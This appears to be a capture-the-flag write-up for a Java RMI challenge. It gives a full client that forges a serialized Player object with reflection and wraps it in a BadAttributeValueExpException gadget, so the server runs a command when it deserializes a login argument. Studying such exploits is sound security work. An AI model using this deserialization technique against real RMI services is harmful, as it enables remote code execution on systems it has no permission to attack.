Create Client to interactive with rmi server, rmi use 100% java serialize/unserialize to transform data so attacker can send malicious serialize object to server and let it unserialize

In Player class we can see the check isAdmin() and method toString() let us run command, so we use java reflect to modify their value, and call gadget
```
gadget BadAttributeValueExpException.readObject() -> Player.toString()
```
to call toString of Player

```java
package rmi;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


public class ASCISPlayer {
    public ASCISPlayer() {
    }

    public static void main(String[] args) throws RemoteException, NotBoundException, NoSuchFieldException, IllegalAccessException {
        String serverIP = "127.0.0.1";
        int serverPort = 1099;
        String command = "calc";

        // Dùng reflection để set các private variable trong class
        Player player = new Player();
        Field isAdmin = player.getClass().getDeclaredField("isAdmin");
        isAdmin.setAccessible(true);
        isAdmin.set(player, true);

        Field logCommand = player.getClass().getDeclaredField("logCommand");
        logCommand.setAccessible(true);
        logCommand.set(player, command);

        // Class này khi được deserialize sẽ tự động gọi object val với method toString()
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, player);

        // Với Remote Method Invocation. Gọi ASCISInterfImpl.login() với arg là object player
        Object name = val;
        Registry registry = LocateRegistry.getRegistry(serverIP, serverPort);
        ASCISInterf ascisInterf = (ASCISInterf)registry.lookup("ascis");
        System.out.println(ascisInterf.login(name));
    }
}
```
